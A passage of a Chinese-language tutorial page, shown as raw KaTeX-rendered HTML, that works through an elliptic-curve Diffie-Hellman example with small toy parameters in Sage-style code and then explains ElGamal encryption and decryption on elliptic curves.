mathnormal">e</span><span class="mord cjk_fallback">的</span><span class="mord mathnormal" style="margin-right:0.07153em;">K</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathnormal">n</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.32833099999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">A</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.32833099999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.13889em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.05017em;">B</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal" style="margin-right:0.05017em;">B</span><span class="mord mathnormal">o</span><span class="mord mathnormal">b</span><span class="mord cjk_fallback">的</span><span class="mord mathnormal" style="margin-right:0.07153em;">K</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">n</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.32833099999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.05017em;">B</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.32833099999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.13889em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">A</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></span></p>
<p>例如</p>
<figure class="highlight matlab"><figcaption data-lang="MATLAB"></figcaption><table><tr><td data-num="1"></td><td><pre>E <span class="token operator">=</span> <span class="token function">EllipticCurve</span><span class="token punctuation">(</span><span class="token function">GF</span><span class="token punctuation">(</span><span class="token number">3851</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">324</span><span class="token punctuation">,</span> <span class="token number">1287</span><span class="token punctuation">]</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="2"></td><td><pre>G <span class="token operator">=</span> <span class="token function">E</span><span class="token punctuation">(</span><span class="token number">920</span><span class="token punctuation">,</span> <span class="token number">303</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="3"></td><td><pre></pre></td></tr><tr><td data-num="4"></td><td><pre>nA <span class="token operator">=</span> <span class="token number">1194</span></pre></td></tr><tr><td data-num="5"></td><td><pre>PA <span class="token operator">=</span> nA <span class="token operator">*</span> G</pre></td></tr><tr><td data-num="6"></td><td><pre>nB <span class="token operator">=</span> <span class="token number">1759</span></pre></td></tr><tr><td data-num="7"></td><td><pre>PB <span class="token operator">=</span> nB <span class="token operator">*</span> G</pre></td></tr><tr><td data-num="8"></td><td><pre></pre></td></tr><tr><td data-num="9"></td><td><pre>KA<span class="token punctuation">.</span><span class="token function">xy</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> KB<span class="token punctuation">.</span><span class="token function">xy</span><span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="10"></td><td><pre># <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token number">2067</span><span class="token punctuation">,</span> <span class="token number">2178</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token number">3684</span><span class="token punctuation">,</span> <span class="token number">3125</span><span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr></table></figure><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><msub><mi>P</mi><mi>A</mi></msub><mo mathvariant="normal">≠</mo><msub><mi>P</mi><mi>B</mi></msub><mo separator="true">,</mo><mspace width="1em"/><mi>b</mi><mi>u</mi><mi>t</mi><mspace width="1em"/><msub><mi>K</mi><mi>A</mi></msub><mo>=</mo><msub><mi>K</mi><mi>B</mi></msub></mrow><annotation encoding="application/x-tex">P_A\neq P_B,\quad but\quad K_A=K_B
</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.32833099999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.13889em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">A</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel"><span class="mrel"><span class="mord vbox"><span class="thinbox"><span class="rlap"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="inner"><span class="mrel"></span></span><span class="fix"></span></span></span></span></span><span class="mrel">=</span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.32833099999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.13889em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.05017em;">B</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:1em;"></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal">b</span><span class="mord mathnormal">u</span><span class="mord mathnormal">t</span><span class="mspace" style="margin-right:1em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07153em;">K</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.32833099999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.07153em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">A</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07153em;">K</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.32833099999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.07153em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.05017em;">B</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></span></p>
<figure class="highlight matlab"><figcaption data-lang="MATLAB"></figcaption><table><tr><td data-num="1"></td><td><pre>#密钥协商 共享密钥</pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token function">print</span><span class="token punctuation">(</span><span class="token punctuation">(</span>nA <span class="token operator">*</span> PB<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">xy</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="3"></td><td><pre># <span class="token punctuation">(</span><span class="token number">3347</span><span class="token punctuation">,</span> <span class="token number">1242</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token function">print</span><span class="token punctuation">(</span><span class="token punctuation">(</span>nB <span class="token operator">*</span> PA<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">xy</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="5"></td><td><pre># <span class="token punctuation">(</span><span class="token number">3347</span><span class="token punctuation">,</span> <span class="token number">1242</span><span class="token punctuation">)</span></pre></td></tr></table></figure><h2 id="椭圆曲线-上的elgamal-公钥密码体制"><a class="anchor" href="#椭圆曲线-上的elgamal-公钥密码体制">#</a> 椭圆曲线 上的 Elgamal 公钥密码体制</h2>
<p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mtext>首先约定好一个</mtext><msub><mi>E</mi><mi>p</mi></msub><mo stretchy="false">(</mo><mi>a</mi><mo separator="true">,</mo><mi>b</mi><mo stretchy="false">)</mo><mo separator="true">,</mo><mtext>将明文</mtext><mi>m</mi><mtext>嵌入曲线点</mtext><msub><mi>p</mi><mi>m</mi></msub><mo separator="true">,</mo><mtext>做加密变换；</mtext><mspace linebreak="newline"></mspace><mtext>取</mtext><msub><mi>E</mi><mi>p</mi></msub><mo stretchy="false">(</mo><mi>a</mi><mo separator="true">,</mo><mi>b</mi><mo stretchy="false">)</mo><mtext>的一个生成元</mtext><mi>G</mi><mo stretchy="false">(</mo><msub><mi>x</mi><mn>1</mn></msub><mo separator="true">,</mo><msub><mi>y</mi><mn>1</mn></msub><mo stretchy="false">)</mo><mo separator="true">,</mo><msub><mi>E</mi><mi>p</mi></msub><mo stretchy="false">(</mo><mi>a</mi><mo separator="true">,</mo><mi>b</mi><mo stretchy="false">)</mo><mtext>和</mtext><mi>G</mi><mtext>作为公开参数。</mtext></mrow><annotation encoding="application/x-tex">首先约定好一个E_p(a,b),将明文m嵌入曲线点p_m,做加密变换；\\取E_p(a,b)的一个生成元G(x_1,y_1),E_p(a,b)和G作为公开参数。
</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.036108em;vertical-align:-0.286108em;"></span><span class="mord cjk_fallback">首</span><span class="mord cjk_fallback">先</span><span class="mord cjk_fallback">约</span><span class="mord cjk_fallback">定</span><span class="mord cjk_fallback">好</span><span class="mord cjk_fallback">一</span><span class="mord cjk_fallback">个</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.15139200000000003em;"><span style="top:-2.5500000000000003em;margin-left:-0.05764em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">p</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal">a</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal">b</span><span class="mclose">)</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord cjk_fallback">将</span><span class="mord cjk_fallback">明</span><span class="mord cjk_fallback">文</span><span class="mord mathnormal">m</span><span class="mord cjk_fallback">嵌</span><span class="mord cjk_fallback">入</span><span class="mord cjk_fallback">曲</span><span class="mord cjk_fallback">线</span><span class="mord cjk_fallback">点</span><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">m</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord cjk_fallback">做</span><span class="mord cjk_fallback">加</span><span class="mord cjk_fallback">密</span><span class="mord cjk_fallback">变</span><span class="mord cjk_fallback">换</span><span class="mord cjk_fallback">；</span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:1.036108em;vertical-align:-0.286108em;"></span><span class="mord cjk_fallback">取</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.15139200000000003em;"><span style="top:-2.5500000000000003em;margin-left:-0.05764em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">p</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal">a</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal">b</span><span class="mclose">)</span><span class="mord cjk_fallback">的</span><span class="mord cjk_fallback">一</span><span class="mord cjk_fallback">个</span><span class="mord cjk_fallback">生</span><span class="mord cjk_fallback">成</span><span class="mord cjk_fallback">元</span><span class="mord mathnormal">G</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.15139200000000003em;"><span style="top:-2.5500000000000003em;margin-left:-0.05764em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">p</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal">a</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal">b</span><span class="mclose">)</span><span class="mord cjk_fallback">和</span><span class="mord mathnormal">G</span><span class="mord cjk_fallback">作</span><span class="mord cjk_fallback">为</span><span class="mord cjk_fallback">公</span><span class="mord cjk_fallback">开</span><span class="mord cjk_fallback">参</span><span class="mord cjk_fallback">数</span><span class="mord cjk_fallback">。</span></span></span></span></span></p>
<p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>A</mi><mi>l</mi><mi>i</mi><mi>c</mi><mi>e</mi><mtext>选取</mtext><msub><mi>n</mi><mi>A</mi></msub><mo separator="true">,</mo><mi>P</mi><mo>=</mo><msub><mi>n</mi><mi>A</mi></msub><mi>G</mi><mtext>为公开钥，</mtext><mi>B</mi><mi>o</mi><mi>b</mi><mtext>选取随机数</mtext><mi>k</mi><mo separator="true">,</mo><mtext>生成密文</mtext><msub><mi>C</mi><mi>m</mi></msub><mo>=</mo><mo stretchy="false">{</mo><mi>k</mi><mi>G</mi><mo separator="true">,</mo><msub><mi>P</mi><mi>m</mi></msub><mo>+</mo><mi>k</mi><msub><mi>P</mi><mi>A</mi></msub><mo stretchy="false">}</mo></mrow><annotation encoding="application/x-tex">Alice选取n_A,P=n_AG为公开钥，Bob选取随机数k,生成密文C_m=\lbrace kG,P_m+kP_A\rbrace
</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathnormal">A</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">i</span><span class="mord mathnormal">c</span><span class="mord mathnormal">e</span><span class="mord cjk_fallback">选</span><span class="mord cjk_fallback">取</span><span class="mord"><span class="mord mathnormal">n</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.32833099999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">A</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathnormal">n</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.32833099999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">A</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord mathnormal">G</span><span class="mord cjk_fallback">为</span><span class="mord cjk_fallback">公</span><span class="mord cjk_fallback">开</span><span class="mord cjk_fallback">钥</span><span class="mord cjk_fallback">，</span><span class="mord mathnormal" style="margin-right:0.05017em;">B</span><span class="mord mathnormal">o</span><span class="mord mathnormal">b</span><span class="mord cjk_fallback">选</span><span class="mord cjk_fallback">取</span><span class="mord cjk_fallback">随</span><span class="mord cjk_fallback">机</span><span class="mord cjk_fallback">数</span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord cjk_fallback">生</span><span class="mord cjk_fallback">成</span><span class="mord cjk_fallback">密</span><span class="mord cjk_fallback">文</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:-0.07153em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">m</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">{</span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mord mathnormal">G</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:-0.13889em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">m</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.32833099999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.13889em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">A</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">}</span></span></span></span></span></p>
<p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><msub><mi>C</mi><mn>1</mn></msub><mo>=</mo><mi>k</mi><mo separator="true">⋅</mo><mi>G</mi><mo separator="true">,</mo><mspace width="1em"/><msub><mi>C</mi><mn>2</mn></msub><mo>=</mo><mi>M</mi><mo>+</mo><mi>k</mi><mo separator="true">⋅</mo><msub><mi>P</mi><mi>A</mi></msub></mrow><annotation encoding="application/x-tex">C_1=k·G, \quad C_2=M+k·P_A
</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.07153em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mpunct">⋅</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal">G</span><span class="mpunct">,</span><span class="mspace" style="margin-right:1em;"></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.07153em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.76666em;vertical-align:-0.08333em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">M</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.84444em;vertical-align:-0.15em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mpunct">⋅</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.32833099999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.13889em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">A</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></span></p>
<p>Alice 受到后解密</p>
<p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><msub><mi>C</mi><mn>2</mn></msub><mo>−</mo><msub><mi>n</mi><mi>A</mi></msub><msub><mi>C</mi><mn>1</mn></msub><mo>=</mo><mi>M</mi><mo>+</mo><mi>k</mi><mo separator="true">⋅</mo><msub><mi>P</mi><mi>A</mi></msub><mo>−</mo><msub><mi>n</mi><mi>A</mi></msub><mi>k</mi><mi>G</mi><mo>=</mo><mi>M</mi></mrow><annotation encoding="application/x-tex">C_2-n_AC_1=M+k·P_A-n_AkG=M
</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.07153em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">n</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.32833099999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">A</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.07153em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.76666em;vertical-align:-0.08333em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">M</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.84444em;vertical-align:-0.15em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mpunct">⋅</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.32833099999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.13889em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">A</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.84444em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">n</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.32833099999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span 